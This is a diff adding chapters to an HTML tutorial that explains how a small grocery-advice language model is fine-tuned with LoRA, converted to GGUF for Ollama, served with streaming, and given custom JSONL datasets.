+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 05</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">The training loop: how it actually learns.</h2>
+    <p class="mt-3 max-w-2xl text-ibm-gray-70 dark:text-ibm-gray-30 text-lg">Four steps, repeated thousands of times. That's all training is.</p>
+
+    <div class="mt-10 grid lg:grid-cols-2 gap-10 items-center">
+      <!-- diagram -->
+      <div class="bg-ibm-gray-10 dark:bg-ibm-gray-90 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <svg class="diagram" viewBox="0 0 480 380" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <marker id="a3" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+              <path d="M0,0 L0,6 L9,3 z" class="fill-blue"/>
+            </marker>
+          </defs>
+
+          <!-- center label -->
+          <circle cx="240" cy="190" r="55" class="fill-card stroke-fg" stroke-width="2"/>
+          <text x="240" y="180" text-anchor="middle" font-size="13" font-weight="600" class="fill-fg">training</text>
+          <text x="240" y="200" text-anchor="middle" font-size="13" font-weight="600" class="fill-fg">loop</text>
+          <text x="240" y="220" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="muted-text">repeat ×N</text>
+
+          <!-- 1 forward -->
+          <rect x="200" y="30" width="80" height="55" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+          <text x="240" y="50" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">1. Forward</text>
+          <text x="240" y="68" text-anchor="middle" font-size="10" class="muted-text">predict</text>
+          <text x="240" y="80" text-anchor="middle" font-size="10" class="muted-text">an answer</text>
+
+          <!-- 2 loss -->
+          <rect x="370" y="160" width="80" height="55" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+          <text x="410" y="180" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">2. Loss</text>
+          <text x="410" y="198" text-anchor="middle" font-size="10" class="muted-text">how wrong</text>
+          <text x="410" y="210" text-anchor="middle" font-size="10" class="muted-text">were we?</text>
+
+          <!-- 3 backward -->
+          <rect x="200" y="295" width="80" height="55" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+          <text x="240" y="315" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">3. Backward</text>
+          <text x="240" y="333" text-anchor="middle" font-size="10" class="muted-text">which knobs</text>
+          <text x="240" y="345" text-anchor="middle" font-size="10" class="muted-text">caused it?</text>
+
+          <!-- 4 update -->
+          <rect x="30" y="160" width="80" height="55" class="fill-blue-soft stroke-blue" stroke-width="2"/>
+          <text x="70" y="180" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">4. Update</text>
+          <text x="70" y="198" text-anchor="middle" font-size="10" class="muted-text">tweak the</text>
+          <text x="70" y="210" text-anchor="middle" font-size="10" class="muted-text">weights</text>
+
+          <!-- arrows -->
+          <path d="M 280 70 Q 380 90, 400 155" class="stroke-blue" stroke-width="2" fill="none" marker-end="url(#a3)"/>
+          <path d="M 400 220 Q 380 290, 285 305" class="stroke-blue" stroke-width="2" fill="none" marker-end="url(#a3)"/>
+          <path d="M 195 320 Q 95 305, 75 220" class="stroke-blue" stroke-width="2" fill="none" marker-end="url(#a3)"/>
+          <path d="M 75 155 Q 95 90, 195 70" class="stroke-blue" stroke-width="2" fill="none" marker-end="url(#a3)"/>
+        </svg>
+      </div>
+
+      <div class="prose-tut text-lg leading-relaxed space-y-4">
+        <h3 class="font-serif font-bold text-xl">1. Forward</h3>
+        <p>Show the model one training example and let it guess. For us: <em>"How do I pick a ripe avocado?"</em> The model produces some sequence of tokens.</p>
+
+        <h3 class="font-serif font-bold text-xl">2. Loss</h3>
+        <p>Compare its guess to the correct answer in our dataset. The loss is a single number — bigger if the guess was bad, smaller if it was close.</p>
+
+        <h3 class="font-serif font-bold text-xl">3. Backward</h3>
+        <p>PyTorch's autograd walks backwards through every step, computing how much each weight contributed to the error. This is the "gradient."</p>
+
+        <h3 class="font-serif font-bold text-xl">4. Update</h3>
+        <p>The optimizer (we use Adam) nudges each weight a tiny bit in the direction that reduces the loss. Just a little — too big a nudge and we overshoot.</p>
+
+        <button data-modal="loop-deep" class="mt-4 inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+          Deeper dive — see the actual PyTorch code
+        </button>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §6 LoRA ====================== -->
+<section id="lora" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 06</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">LoRA — teaching old models new tricks, cheaply.</h2>
+
+    <div class="mt-10 grid lg:grid-cols-2 gap-10 items-start">
+      <div class="prose-tut text-lg leading-relaxed space-y-5">
+        <p>Here's a problem: our model has 135 <em>million</em> weights. Training all of them takes a lot of memory and time. And we only have 65 examples — not nearly enough to retrain the whole thing without breaking what it already knows.</p>
+        <p><strong>LoRA</strong> (Low-Rank Adaptation) is the trick. Instead of changing the millions of original weights, we:</p>
+        <ol class="list-decimal pl-6 space-y-2">
+          <li>Freeze the entire base model. Nothing changes.</li>
+          <li>Add a small "side patch" — two tiny matrices that get multiplied together — alongside certain parts of the model.</li>
+          <li>Train <em>only</em> those tiny matrices. Maybe 700,000 numbers instead of 135 million.</li>
+          <li>When we're done, mathematically merge the side patch back into the original weights. The result is a single normal model that's been gently steered toward our task.</li>
+        </ol>
+        <p>It's like teaching a Michelin-starred chef one new dish — you don't send them back to culinary school. You just show them the recipe.</p>
+
+        <div class="flex flex-wrap gap-2 mt-5">
+          <button data-modal="lora-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+            Deeper dive — the LoRA math
+          </button>
+          <a href="https://arxiv.org/abs/2106.09685" target="_blank" rel="noopener" class="inline-flex items-center gap-2 px-3 py-2 text-sm text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">
+            Original LoRA paper ↗
+          </a>
+        </div>
+      </div>
+
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <svg class="diagram" viewBox="0 0 460 380" xmlns="http://www.w3.org/2000/svg">
+          <!-- frozen big -->
+          <rect x="30" y="40" width="280" height="180" rx="4" class="fill-card stroke-fg" stroke-width="2"/>
+          <text x="170" y="62" text-anchor="middle" font-size="11" font-family="IBM Plex Mono" class="muted-text">BASE MODEL · 135M weights</text>
+          <!-- grid of dots -->
+          <g class="fill-fg" opacity="0.4">
+            <g id="g1">
+              <circle cx="50" cy="85" r="2.2"/><circle cx="75" cy="85" r="2.2"/><circle cx="100" cy="85" r="2.2"/><circle cx="125" cy="85" r="2.2"/><circle cx="150" cy="85" r="2.2"/><circle cx="175" cy="85" r="2.2"/><circle cx="200" cy="85" r="2.2"/><circle cx="225" cy="85" r="2.2"/><circle cx="250" cy="85" r="2.2"/><circle cx="275" cy="85" r="2.2"/><circle cx="295" cy="85" r="2.2"/>
+              <circle cx="50" cy="110" r="2.2"/><circle cx="75" cy="110" r="2.2"/><circle cx="100" cy="110" r="2.2"/><circle cx="125" cy="110" r="2.2"/><circle cx="150" cy="110" r="2.2"/><circle cx="175" cy="110" r="2.2"/><circle cx="200" cy="110" r="2.2"/><circle cx="225" cy="110" r="2.2"/><circle cx="250" cy="110" r="2.2"/><circle cx="275" cy="110" r="2.2"/><circle cx="295" cy="110" r="2.2"/>
+              <circle cx="50" cy="135" r="2.2"/><circle cx="75" cy="135" r="2.2"/><circle cx="100" cy="135" r="2.2"/><circle cx="125" cy="135" r="2.2"/><circle cx="150" cy="135" r="2.2"/><circle cx="175" cy="135" r="2.2"/><circle cx="200" cy="135" r="2.2"/><circle cx="225" cy="135" r="2.2"/><circle cx="250" cy="135" r="2.2"/><circle cx="275" cy="135" r="2.2"/><circle cx="295" cy="135" r="2.2"/>
+              <circle cx="50" cy="160" r="2.2"/><circle cx="75" cy="160" r="2.2"/><circle cx="100" cy="160" r="2.2"/><circle cx="125" cy="160" r="2.2"/><circle cx="150" cy="160" r="2.2"/><circle cx="175" cy="160" r="2.2"/><circle cx="200" cy="160" r="2.2"/><circle cx="225" cy="160" r="2.2"/><circle cx="250" cy="160" r="2.2"/><circle cx="275" cy="160" r="2.2"/><circle cx="295" cy="160" r="2.2"/>
+              <circle cx="50" cy="185" r="2.2"/><circle cx="75" cy="185" r="2.2"/><circle cx="100" cy="185" r="2.2"/><circle cx="125" cy="185" r="2.2"/><circle cx="150" cy="185" r="2.2"/><circle cx="175" cy="185" r="2.2"/><circle cx="200" cy="185" r="2.2"/><circle cx="225" cy="185" r="2.2"/><circle cx="250" cy="185" r="2.2"/><circle cx="275" cy="185" r="2.2"/><circle cx="295" cy="185" r="2.2"/>
+            </g>
+          </g>
+          <!-- frozen tag -->
+          <rect x="320" y="60" width="100" height="26" class="fill-card stroke-fg" stroke-width="1.5" rx="3"/>
+          <text x="370" y="78" text-anchor="middle" font-size="11" font-family="IBM Plex Mono" class="fill-fg">❄ FROZEN</text>
+
+          <!-- LoRA small -->
+          <rect x="40" y="245" width="70" height="60" rx="3" class="fill-blue"/>
+          <g fill="white" opacity="0.9">
+            <circle cx="56" cy="262" r="2.5"/><circle cx="76" cy="262" r="2.5"/><circle cx="96" cy="262" r="2.5"/>
+            <circle cx="56" cy="280" r="2.5"/><circle cx="76" cy="280" r="2.5"/><circle cx="96" cy="280" r="2.5"/>
+            <circle cx="56" cy="295" r="2.5"/><circle cx="76" cy="295" r="2.5"/><circle cx="96" cy="295" r="2.5"/>
+          </g>
+          <text x="125" y="265" font-size="13" font-weight="600" class="fill-fg">+ LoRA adapter</text>
+          <text x="125" y="282" font-size="11" font-family="IBM Plex Mono" class="muted-text">~700K trainable</text>
+          <text x="125" y="298" font-size="11" font-family="IBM Plex Mono" class="muted-text">weights (0.5%)</text>
+
+          <text x="230" y="340" text-anchor="middle" font-size="11" font-family="IBM Plex Mono" class="fill-blue">→ merge into base → final model</text>
+        </svg>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §7 OLLAMA & GGUF ====================== -->
+<section id="ollama" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 07</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">From PyTorch to Ollama: the GGUF format.</h2>
+
+    <div class="mt-8 prose-tut text-lg leading-relaxed max-w-3xl space-y-5">
+      <p>After training, PyTorch saves the model as a bunch of files: weights in <code>.safetensors</code>, settings in <code>config.json</code>, the tokenizer in another folder. That's fine for Python, but Ollama wants something simpler — <strong>one</strong> file with everything in it.</p>
+      <p>That format is called <strong>GGUF</strong> (it stands for "GGML Universal Format" — a bit of an acronym sandwich). Think of it like zipping a complicated folder of files into a single ZIP. Plus, GGUF stores the numbers in a clever way that makes the model fast to load and small to store, especially on regular computers without expensive GPUs.</p>
+      <p>We use a tool called <strong>llama.cpp</strong> (a famous open-source project) to do the conversion. One Python command, one file out.</p>
+    </div>
+
+    <div class="mt-8 grid md:grid-cols-2 gap-6">
+      <div class="bg-ibm-gray-10 dark:bg-ibm-gray-90 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <div class="font-mono text-xs text-ibm-gray-60 dark:text-ibm-gray-50 mb-2">BEFORE — PyTorch format</div>
+        <pre class="text-xs leading-relaxed"><code>output/merged/
+├── config.json
+├── model.safetensors  (260 MB)
+├── tokenizer.json
+├── tokenizer_config.json
+└── special_tokens_map.json
+
+5 files · ~270 MB total</code></pre>
+      </div>
+      <div class="bg-ibm-blue-60 text-white p-6">
+        <div class="font-mono text-xs opacity-80 mb-2">AFTER — GGUF</div>
+        <pre class="text-xs leading-relaxed text-white"><code>output/
+└── grocery-slm.gguf   (270 MB)
+
+1 file · everything inside</code></pre>
+        <p class="mt-3 text-sm opacity-90">Tokenizer, weights, settings — all baked in.</p>
+      </div>
+    </div>
+
+    <!-- Modelfile -->
+    <div class="mt-12">
+      <h3 class="font-serif font-bold text-2xl">The Modelfile — Ollama's recipe card</h3>
+      <p class="mt-3 text-lg text-ibm-gray-70 dark:text-ibm-gray-30 max-w-3xl">
+        A GGUF on its own is just weights. To tell Ollama <em>how to use</em> the model, we add a <strong>Modelfile</strong>. It's a tiny text file with simple instructions.
+      </p>
+
+      <div class="mt-6 bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-5 overflow-x-auto border border-ibm-gray-80">
+<pre class="text-sm"><code><span class="text-ibm-blue-40"># Where to find the weights</span>
+<span class="text-ibm-blue-30 font-semibold">FROM</span> ./grocery-slm.gguf
+
+<span class="text-ibm-blue-40"># How to format messages before the model sees them</span>
+<span class="text-ibm-blue-30 font-semibold">TEMPLATE</span> """{{ if .System }}&lt;|im_start|&gt;system
+{{ .System }}&lt;|im_end|&gt;
+{{ end }}&lt;|im_start|&gt;user
+{{ .Prompt }}&lt;|im_end|&gt;
+&lt;|im_start|&gt;assistant
+"""
+
+<span class="text-ibm-blue-40"># Generation knobs</span>
+<span class="text-ibm-blue-30 font-semibold">PARAMETER</span> temperature 0.6
+<span class="text-ibm-blue-30 font-semibold">PARAMETER</span> top_p 0.9
+
+<span class="text-ibm-blue-40"># The personality (system prompt)</span>
+<span class="text-ibm-blue-30 font-semibold">SYSTEM</span> """You are GroceryGPT..."""</code></pre>
+      </div>
+
+      <div class="mt-6 grid md:grid-cols-2 gap-4 text-sm">
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-4">
+          <code class="font-semibold text-ibm-blue-60 dark:text-ibm-blue-40">FROM</code>
+          <p class="mt-1 text-ibm-gray-70 dark:text-ibm-gray-30">Points to the GGUF file with the weights. The starting line.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-4">
+          <code class="font-semibold text-ibm-blue-60 dark:text-ibm-blue-40">TEMPLATE</code>
+          <p class="mt-1 text-ibm-gray-70 dark:text-ibm-gray-30">The exact text format the model expects. Different model families use different special tokens.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-4">
+          <code class="font-semibold text-ibm-blue-60 dark:text-ibm-blue-40">PARAMETER</code>
+          <p class="mt-1 text-ibm-gray-70 dark:text-ibm-gray-30">Generation knobs — temperature (creativity), top_p (variety), num_ctx (context window).</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-4">
+          <code class="font-semibold text-ibm-blue-60 dark:text-ibm-blue-40">SYSTEM</code>
+          <p class="mt-1 text-ibm-gray-70 dark:text-ibm-gray-30">A hidden message sent before every conversation. Sets the personality.</p>
+        </div>
+      </div>
+
+      <div class="mt-6 flex flex-wrap gap-3">
+        <button data-modal="gguf-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+          Deeper dive — quantization (Q4, Q8, F16)
+        </button>
+        <a href="https://github.com/ollama/ollama/blob/main/docs/modelfile.md" target="_blank" rel="noopener" class="inline-flex items-center gap-2 px-3 py-2 text-sm text-ibm-blue-60 dark:text-ibm-blue-40 hover:underline">
+          Full Modelfile reference ↗
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §8 END TO END FLOW ====================== -->
+<section id="flow" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 08</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">End to end: what happens when you click "send"?</h2>
+
+    <div class="mt-8 bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6 overflow-x-auto">
+      <svg class="diagram" viewBox="0 0 900 360" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="a4" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L9,3 z" class="fill-fg"/>
+          </marker>
+          <marker id="a4b" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L9,3 z" class="fill-blue"/>
+          </marker>
+        </defs>
+
+        <!-- lanes -->
+        <g font-family="IBM Plex Sans">
+          <text x="80" y="30" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">browser</text>
+          <text x="290" y="30" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">nginx (proxy)</text>
+          <text x="510" y="30" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">ollama</text>
+          <text x="780" y="30" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">model</text>
+        </g>
+        <line x1="80"  y1="40" x2="80"  y2="340" class="stroke-fg" stroke-width="0.5" stroke-dasharray="2,4"/>
+        <line x1="290" y1="40" x2="290" y2="340" class="stroke-fg" stroke-width="0.5" stroke-dasharray="2,4"/>
+        <line x1="510" y1="40" x2="510" y2="340" class="stroke-fg" stroke-width="0.5" stroke-dasharray="2,4"/>
+        <line x1="780" y1="40" x2="780" y2="340" class="stroke-fg" stroke-width="0.5" stroke-dasharray="2,4"/>
+
+        <!-- step 1 -->
+        <line x1="85" y1="80" x2="285" y2="80" class="stroke-fg" stroke-width="1.5" marker-end="url(#a4)"/>
+        <text x="185" y="72" text-anchor="middle" font-size="11" class="fill-fg">① POST /api/chat</text>
+        <text x="185" y="96" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="muted-text">{ "messages": [...] }</text>
+
+        <!-- step 2 -->
+        <line x1="295" y1="130" x2="505" y2="130" class="stroke-fg" stroke-width="1.5" marker-end="url(#a4)"/>
+        <text x="395" y="122" text-anchor="middle" font-size="11" class="fill-fg">② forwarded as-is</text>
+
+        <!-- step 3 -->
+        <line x1="515" y1="170" x2="775" y2="170" class="stroke-fg" stroke-width="1.5" marker-end="url(#a4)"/>
+        <text x="645" y="162" text-anchor="middle" font-size="11" class="fill-fg">③ tokenize → run → generate</text>
+        <text x="645" y="186" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="muted-text">attention layers · softmax · sample</text>
+
+        <!-- step 4 stream tokens -->
+        <line x1="775" y1="230" x2="515" y2="230" class="stroke-blue" stroke-width="1.5" marker-end="url(#a4b)"/>
+        <text x="645" y="222" text-anchor="middle" font-size="11" class="fill-blue">④ one token at a time</text>
+
+        <!-- step 5 -->
+        <line x1="505" y1="270" x2="295" y2="270" class="stroke-blue" stroke-width="1.5" marker-end="url(#a4b)"/>
+        <text x="400" y="262" text-anchor="middle" font-size="11" class="fill-blue">⑤ NDJSON chunks</text>
+
+        <!-- step 6 -->
+        <line x1="285" y1="310" x2="85" y2="310" class="stroke-blue" stroke-width="1.5" marker-end="url(#a4b)"/>
+        <text x="185" y="302" text-anchor="middle" font-size="11" class="fill-blue">⑥ painted as they arrive</text>
+      </svg>
+    </div>
+
+    <div class="mt-6 prose-tut text-lg leading-relaxed max-w-3xl space-y-3">
+      <p>The key word here is <strong>streaming</strong>. The model writes its answer one token at a time. We don't wait for the whole thing — each token gets sent back to your screen immediately. That's why answers feel like they're being typed.</p>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §9 GENERATION MATH ====================== -->
+<section id="gen-math" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 09</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">How does the model pick the next word?</h2>
+    <p class="mt-3 max-w-2xl text-ibm-gray-70 dark:text-ibm-gray-30 text-lg">Softmax, in three minutes.</p>
+
+    <div class="mt-10 grid lg:grid-cols-2 gap-10">
+      <div class="prose-tut text-lg leading-relaxed space-y-5">
+        <p>After all the math, the model spits out a list of raw scores — one for every possible next token (around 49,000 of them). These are called <strong>logits</strong>. They're not probabilities yet — just preferences.</p>
+        <p>To turn them into probabilities, we use a function called <strong>softmax</strong>. It does two things:</p>
+        <ol class="list-decimal pl-6 space-y-2">
+          <li>Pushes bigger scores way up and smaller scores way down (exponentially).</li>
+          <li>Scales everything so it adds up to 1.0 — like a percentage.</li>
+        </ol>
+        <p>Then we don't <em>always</em> pick the highest one. That would be boring and repetitive. Instead we <strong>sample</strong>: roll dice weighted by the probabilities. The "<strong>temperature</strong>" parameter controls how spiky vs flat those probabilities are. Low temperature = always pick the favorite. High temperature = more variety, more risk of nonsense.</p>
+
+        <button data-modal="softmax-deep" class="inline-flex items-center gap-2 px-3 py-2 text-sm border border-ibm-blue-60 text-ibm-blue-60 dark:text-ibm-blue-40 dark:border-ibm-blue-40 hover:bg-ibm-blue-60 hover:text-white dark:hover:bg-ibm-blue-40 dark:hover:text-ibm-gray-100 transition">
+          Deeper dive — softmax with actual numbers
+        </button>
+      </div>
+
+      <div class="bg-white dark:bg-ibm-gray-100 border border-ibm-gray-20 dark:border-ibm-gray-80 p-6">
+        <svg class="diagram" viewBox="0 0 460 380" xmlns="http://www.w3.org/2000/svg">
+          <text x="230" y="25" text-anchor="middle" font-size="13" font-weight="600" class="fill-fg">After "How do I store" the model sees:</text>
+
+          <!-- raw scores -->
+          <text x="40" y="60" font-size="11" font-family="IBM Plex Mono" class="muted-text">LOGITS (raw scores)</text>
+          <g font-family="IBM Plex Mono" font-size="12">
+            <rect x="40" y="70" width="80" height="22" class="fill-card stroke-fg" stroke-width="1"/><text x="50" y="86" class="fill-fg">herbs</text><text x="105" y="86" text-anchor="end" class="fill-fg">8.2</text>
+            <rect x="40" y="94" width="80" height="22" class="fill-card stroke-fg" stroke-width="1"/><text x="50" y="110" class="fill-fg">food</text><text x="105" y="110" text-anchor="end" class="fill-fg">7.5</text>
+            <rect x="40" y="118" width="80" height="22" class="fill-card stroke-fg" stroke-width="1"/><text x="50" y="134" class="fill-fg">meat</text><text x="105" y="134" text-anchor="end" class="fill-fg">5.1</text>
+            <rect x="40" y="142" width="80" height="22" class="fill-card stroke-fg" stroke-width="1"/><text x="50" y="158" class="fill-fg">bikes</text><text x="105" y="158" text-anchor="end" class="fill-fg">1.0</text>
+          </g>
+
+          <!-- arrow -->
+          <line x1="130" y1="125" x2="180" y2="125" class="stroke-fg" stroke-width="1.5" marker-end="url(#a4)"/>
+          <text x="155" y="115" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="fill-blue">softmax</text>
+
+          <!-- probabilities -->
+          <text x="200" y="60" font-size="11" font-family="IBM Plex Mono" class="muted-text">PROBABILITIES (sum = 1.0)</text>
+          <g font-family="IBM Plex Mono" font-size="12">
+            <rect x="200" y="70" width="220" height="22" class="fill-card stroke-fg" stroke-width="1"/>
+            <rect x="200" y="70" width="143" height="22" class="fill-blue"/>
+            <text x="210" y="86" fill="white">herbs</text><text x="410" y="86" text-anchor="end" class="fill-fg">0.65</text>
+
+            <rect x="200" y="94" width="220" height="22" class="fill-card stroke-fg" stroke-width="1"/>
+            <rect x="200" y="94" width="70" height="22" class="fill-blue" opacity="0.7"/>
+            <text x="210" y="110" class="fill-fg">food</text><text x="410" y="110" text-anchor="end" class="fill-fg">0.32</text>
+
+            <rect x="200" y="118" width="220" height="22" class="fill-card stroke-fg" stroke-width="1"/>
+            <rect x="200" y="118" width="7" height="22" class="fill-blue" opacity="0.4"/>
+            <text x="210" y="134" class="fill-fg">meat</text><text x="410" y="134" text-anchor="end" class="fill-fg">0.03</text>
+
+            <rect x="200" y="142" width="220" height="22" class="fill-card stroke-fg" stroke-width="1"/>
+            <text x="210" y="158" class="fill-fg">bikes</text><text x="410" y="158" text-anchor="end" class="fill-fg">~0</text>
+          </g>
+
+          <!-- arrow down -->
+          <line x1="230" y1="180" x2="230" y2="210" class="stroke-fg" stroke-width="1.5" marker-end="url(#a4)"/>
+
+          <!-- sampling -->
+          <rect x="40" y="220" width="380" height="80" class="fill-blue-soft stroke-blue" stroke-width="2" rx="3"/>
+          <text x="230" y="240" text-anchor="middle" font-size="12" font-weight="600" class="fill-fg">sample (roll weighted dice)</text>
+          <text x="230" y="260" text-anchor="middle" font-size="11" class="fill-fg">→ this time it picks "herbs"</text>
+          <text x="230" y="282" text-anchor="middle" font-size="10" font-family="IBM Plex Mono" class="muted-text">temperature controls how spiky/flat the dice are</text>
+
+          <!-- repeat note -->
+          <text x="230" y="335" text-anchor="middle" font-size="11" class="muted-text">↻ now the input is "How do I store herbs", repeat</text>
+          <text x="230" y="355" text-anchor="middle" font-size="11" class="muted-text">until the model outputs the special "end" token</text>
+        </svg>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<!-- ====================== §10 YOUR OWN DATA ====================== -->
+<section id="own-data" class="border-b border-ibm-gray-20 dark:border-ibm-gray-80 bg-ibm-gray-10/50 dark:bg-ibm-gray-90/50">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6 py-16">
+    <div class="font-mono text-xs uppercase tracking-widest text-ibm-blue-60 dark:text-ibm-blue-40">Chapter 10</div>
+    <h2 class="font-serif font-bold text-3xl sm:text-4xl mt-2 leading-tight max-w-3xl">Teach it something new — your own dataset.</h2>
+    <p class="mt-3 max-w-3xl text-ibm-gray-70 dark:text-ibm-gray-30 text-lg">
+      The whole system is dataset-shaped. Swap out <code class="font-mono text-base text-ibm-blue-60 dark:text-ibm-blue-40">data/dataset.jsonl</code>, retrain, and you've got a completely different specialist. Here are three real templates to start from.
+    </p>
+
+    <!-- The general format -->
+    <div class="mt-10 bg-white dark:bg-ibm-gray-100 border-l-4 border-ibm-blue-60 p-6">
+      <h3 class="font-serif font-bold text-xl mb-3">The format, always</h3>
+      <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4">One example per line. Each line is a JSON object with a <code>messages</code> array. Two roles: <code>user</code> (the question) and <code>assistant</code> (the perfect answer you wish the model would give).</p>
+      <pre class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-4 text-sm overflow-x-auto"><code>{"messages": [
+  {"role": "user",      "content": "..."},
+  {"role": "assistant", "content": "..."}
+]}</code></pre>
+      <p class="mt-4 text-sm text-ibm-gray-60 dark:text-ibm-gray-50">Aim for 50+ diverse examples to start. More is better, but quality &gt; quantity. Real, varied, accurate examples beat 1,000 copy-pasted near-duplicates every time.</p>
+    </div>
+
+    <!-- Template 1: Code -->
+    <div class="mt-10">
+      <div class="flex items-baseline gap-3 mb-3">
+        <div class="w-10 h-10 bg-ibm-blue-60 text-white flex items-center justify-center font-mono font-bold">A</div>
+        <h3 class="font-serif font-bold text-2xl">Template A — Code snippets</h3>
+      </div>
+      <p class="text-ibm-gray-70 dark:text-ibm-gray-30 mb-4 max-w-3xl">For making a coding assistant. Each example is a programming question and a clean, runnable solution.</p>
+
+      <div class="relative">
+        <pre id="code-template" class="bg-ibm-gray-100 dark:bg-ibm-gray-90 text-ibm-gray-10 p-5 text-xs overflow-x-auto"><code>{"messages":[{"role":"user","content":"How do I read a file line by line in Python?"},{"role":"assistant","content":"Use a context manager — it auto-closes the file:\n\n```python\nwith open('file.txt') as f:\n    for line in f:\n        print(line.rstrip())\n```\n\nThis streams one line at a time, so it works on huge files."}]}
+{"messages":[{"role":"user","content":"Reverse a string in JavaScript."},{"role":"assistant","content":"```javascript\nconst reversed = str.split('').reverse().join('');\n```\n\nSplit into characters, reverse the array, join back. Note: this breaks on emoji and some Unicode — use Array.from(str) for those."}]}
+{"messages":[{"role":"user","content":"What's the difference between let and const in JS?"},{"role":"assistant","content":"`const` means you can't reassign the variable. `let` means you can. Both are block-scoped (unlike var). Default to const; use let only when you genuinely need to reassign."}]}</code></pre>
+        <button class="copy-btn absolute top-3 right-3 text-xs font-mono px-2 py-1 bg-ibm-gray-10 dark:bg-ibm-gray-80 text-ibm-blue-60 dark:text-ibm-blue-40 border border-ibm-gray-30 dark:border-ibm-gray-70" data-copy-target="code-template">copy</button>
+      </div>
+
+      <div class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Where to find data</div>
+          <p class="text-ibm-gray-70 dark:text-ibm-gray-30">Your own commits, Stack Overflow Q&amp;A, public docs of libraries you love. Pair each question with a tested answer.</p>
+        </div>
+        <div class="border border-ibm-gray-20 dark:border-ibm-gray-80 p-3">
+          <div class="font-semibold mb-1">Pitfalls</div>
